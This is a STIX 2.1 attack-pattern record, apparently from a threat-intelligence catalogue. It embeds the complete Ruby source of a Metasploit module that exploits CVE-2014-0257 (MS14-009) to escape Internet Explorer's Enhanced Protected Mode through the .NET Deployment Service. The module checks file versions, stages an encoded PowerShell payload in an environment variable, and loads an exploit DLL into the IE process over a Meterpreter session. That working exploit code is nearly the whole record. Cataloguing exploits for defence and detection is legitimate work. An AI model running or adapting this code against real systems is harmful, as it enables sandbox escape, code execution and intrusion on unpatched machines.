{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6041b227-f6b9-42aa-9099-db73e7d83923",
    "created": "2024-08-14T16:49:01.743476Z",
    "modified": "2024-08-14T16:49:01.743481Z",
    "name": "MS14-009 .NET Deployment Service IE Sandbox Escape",
    "description": " This module abuses a process creation policy in Internet Explorer's sandbox, specifically in the .NET Deployment Service (dfsvc.exe), which allows the attacker to escape the Enhanced Protected Mode, and execute code with Medium Integrity.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms14_009_ie_dfsvc.rb",
            "external_id": "ms14_009_ie_dfsvc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0257"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/tyranid/IE11SandboxEscapes"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::File\n\n  NET_VERSIONS = {\n    '4.5' => {\n      'dfsvc' => '4.0.30319.17929.17',\n      'mscorlib' => '4.0.30319.18063.18'\n    },\n    '4.5.1' => {\n      'dfsvc' => '4.0.30319.18408.18',\n      'mscorlib' => '4.0.30319.18444.18'\n    }\n  }\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'\t=> 'MS14-009 .NET Deployment Service IE Sandbox Escape',\n        'Description'\t=> %q{\n          This module abuses a process creation policy in Internet Explorer's sandbox, specifically\n          in the .NET Deployment Service (dfsvc.exe), which allows the attacker to escape the\n          Enhanced Protected Mode, and execute code with Medium Integrity.\n        },\n        'License'\t=> MSF_LICENSE,\n        'Author' => [\n          'James Forshaw', # Vulnerability Discovery and original exploit code\n          'juan vazquez' # metasploit module\n        ],\n        'Platform'\t=> [ 'win' ],\n        'SessionTypes'\t=> [ 'meterpreter' ],\n        'Targets' => [\n          [ 'IE 8 - 11', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 30\n        },\n        'DisclosureDate' => '2014-02-11',\n        'References' => [\n          ['CVE', '2014-0257'],\n          ['MSB', 'MS14-009'],\n          ['BID', '65417'],\n          ['URL', 'https://github.com/tyranid/IE11SandboxEscapes']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_loadlib\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    unless file_exist?(\"#{get_env(\"windir\")}\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\dfsvc.exe\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    net_version = get_net_version\n\n    if net_version.empty?\n      return Exploit::CheckCode::Unknown\n    end\n\n    unless file_exist?(\"#{get_env(\"windir\")}\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\mscorlib.dll\")\n      return Exploit::CheckCode::Detected\n    end\n\n    mscorlib_version = get_mscorlib_version\n\n    if Rex::Version.new(mscorlib_version) >= Rex::Version.new(NET_VERSIONS[net_version][\"mscorlib\"])\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Appears\n  end\n\n  def get_net_version\n    net_version = \"\"\n\n    dfsvc_version = file_version(\"#{get_env(\"windir\")}\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\dfsvc.exe\")\n    dfsvc_version = dfsvc_version.join(\".\")\n\n    NET_VERSIONS.each do |k, v|\n      if v[\"dfsvc\"] == dfsvc_version\n        net_version = k\n      end\n    end\n\n    net_version\n  end\n\n  def get_mscorlib_version\n    mscorlib_version = file_version(\"#{get_env(\"windir\")}\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\mscorlib.dll\")\n    mscorlib_version.join(\".\")\n  end\n\n  def exploit\n    print_status(\"Running module against #{sysinfo['Computer']}\") unless sysinfo.nil?\n\n    mod_handle = session.railgun.kernel32.GetModuleHandleA('iexplore.exe')\n    if mod_handle['return'] == 0\n      fail_with(Failure::NotVulnerable, \"Not running inside an Internet Explorer process\")\n    end\n\n    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NotVulnerable, \"Not running at Low Integrity\")\n    end\n\n    print_status(\"Searching .NET Deployment Service (dfsvc.exe)...\")\n\n    unless file_exist?(\"#{get_env(\"windir\")}\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\dfsvc.exe\")\n      fail_with(Failure::NotVulnerable, \".NET Deployment Service (dfsvc.exe) not found\")\n    end\n\n    net_version = get_net_version\n\n    if net_version.empty?\n      fail_with(Failure::NotVulnerable, \"This module only targets .NET Deployment Service from .NET 4.5 and .NET 4.5.1\")\n    end\n\n    print_good(\".NET Deployment Service from .NET #{net_version} found.\")\n\n    print_status(\"Checking if .NET is patched...\")\n\n    unless file_exist?(\"#{get_env(\"windir\")}\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\mscorlib.dll\")\n      fail_with(Failure::NotVulnerable, \".NET Installation can not be verified (mscorlib.dll not found)\")\n    end\n\n    mscorlib_version = get_mscorlib_version\n\n    if Rex::Version.new(mscorlib_version) >= Rex::Version.new(NET_VERSIONS[net_version][\"mscorlib\"])\n      fail_with(Failure::NotVulnerable, \".NET Installation not vulnerable\")\n    end\n\n    print_good(\".NET looks vulnerable, exploiting...\")\n\n    cmd = cmd_psh_payload(payload.encoded,\n                          payload_instance.arch.first,\n                          {\n                            :remove_comspec => true\n                          })\n\n    cmd.gsub!('powershell.exe ', '')\n    session.railgun.kernel32.SetEnvironmentVariableA(\"PSHCMD\", cmd)\n\n    temp = get_env('TEMP')\n\n    print_status(\"Loading Exploit Library...\")\n\n    session.core.load_library(\n      'LibraryFilePath' => ::File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2014-0257\", \"CVE-2014-0257.dll\"),\n      'TargetFilePath' => temp + \"\\\\CVE-2014-0257.dll\",\n      'UploadLibrary' => true,\n      'Extension' => false,\n      'SaveToDisk' => false\n    )\n  end\n\n  def cleanup\n    session.railgun.kernel32.SetEnvironmentVariableA(\"PSHCMD\", nil)\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-11",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}